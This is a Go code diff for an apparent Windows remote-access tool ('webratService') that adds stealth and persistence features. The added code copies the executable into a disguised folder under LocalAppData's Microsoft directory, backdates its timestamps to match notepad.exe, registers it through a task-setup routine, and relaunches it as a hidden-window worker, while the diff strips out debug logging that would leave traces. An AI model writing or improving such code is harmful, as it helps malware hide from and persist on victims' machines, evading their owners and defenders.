@@ -66,69 +66,70 @@ func (s *webratService) Execute(args []string, r <-chan svc.ChangeRequest, chang
 	}
 }
 
+func touchTimestamps(targetPath string) {
+	refPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "notepad.exe")
+	info, err := os.Stat(refPath)
+	if err != nil {
+		return
+	}
+	_ = os.Chtimes(targetPath, info.ModTime(), info.ModTime())
+}
+
+func tryDisguiseCopy(exePath string) (string, bool) {
+	localApp := os.Getenv(getLocalAppDataEnv())
+	msDir := getMicrosoftDirName()
+	exeName := getDisguisedExeName()
+
+	dirs := getDisguiseDirList()
+	rand.Shuffle(len(dirs), func(i, j int) { dirs[i], dirs[j] = dirs[j], dirs[i] })
+
+	for _, d := range dirs {
+		dir := filepath.Join(localApp, msDir, d)
+		target := filepath.Join(dir, exeName)
+
+		if err := os.MkdirAll(dir, 0755); err != nil {
+			continue
+		}
+		if err := copyFile(exePath, target); err != nil {
+			continue
+		}
+		if _, err := os.Stat(target); err != nil {
+			continue
+		}
+
+		touchTimestamps(target)
+		return target, true
+	}
+
+	return exePath, false
+}
+
 func runPrimaryWithWorker() {
-	log.Println("[runPrimary] entered")
 	exePath, err := os.Executable()
 	if err != nil {
-		log.Println("[runPrimary] os.Executable error:", err, "-> loopA")
 		loopA()
 		return
 	}
-	log.Println("[runPrimary] exePath=", exePath)
 
-	disguisedDir := filepath.Join(os.Getenv(getLocalAppDataEnv()), getMicrosoftDirName(), getDisguiseDir())
-	disguisedPath := filepath.Join(disguisedDir, getDisguisedExeName())
-	log.Println("[runPrimary] disguisedDir=", disguisedDir)
-	log.Println("[runPrimary] disguisedPath=", disguisedPath)
+	disguisedPath, copied := tryDisguiseCopy(exePath)
 
-	copied := false
-	if err := os.MkdirAll(disguisedDir, 0755); err == nil {
-		log.Println("[runPrimary] MkdirAll OK")
-		if cpErr := copyFile(exePath, disguisedPath); cpErr == nil {
-			if _, statErr := os.Stat(disguisedPath); statErr == nil {
-				copied = true
-				log.Println("[runPrimary] copy+stat OK")
-			} else {
-				log.Println("[runPrimary] stat after copy FAILED:", statErr)
-			}
-		} else {
-			log.Println("[runPrimary] copyFile FAILED:", cpErr)
-		}
-	} else {
-		log.Println("[runPrimary] MkdirAll FAILED:", err)
-	}
-	if !copied {
-		disguisedPath = exePath
-		log.Println("[runPrimary] fallback disguisedPath=exePath")
-	}
-
-	log.Println("[runPrimary] opSetupTask with path=", disguisedPath)
 	opSetupTask(disguisedPath)
 
 	exeNorm, _ := filepath.Abs(exePath)
 	disguisedNorm, _ := filepath.Abs(disguisedPath)
-	log.Println("[runPrimary] exeNorm=", exeNorm, "disguisedNorm=", disguisedNorm)
-	if !strings.EqualFold(exeNorm, disguisedNorm) {
-		log.Println("[runPrimary] launching disguised copy as worker")
+
+	if copied && !strings.EqualFold(exeNorm, disguisedNorm) {
 		cmd := exec.Command(disguisedPath, "worker")
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		if err := cmd.Start(); err == nil {
-			log.Println("[runPrimary] worker launched pid=", cmd.Process.Pid, "-> returning")
 			return
-		} else {
-			log.Println("[runPrimary] worker launch FAILED:", err)
 		}
-	} else {
-		log.Println("[runPrimary] paths equal, skipping worker launch")
 	}
 
-	log.Println("[runPrimary] fallthrough to loopA")
 	loopA()
 }
 
 func runWorkerGuard() {
-	_ = setupLogger()
-	log.Println("[workerGuard] entered, calling loopA")
 	loopA()
 }
 `)
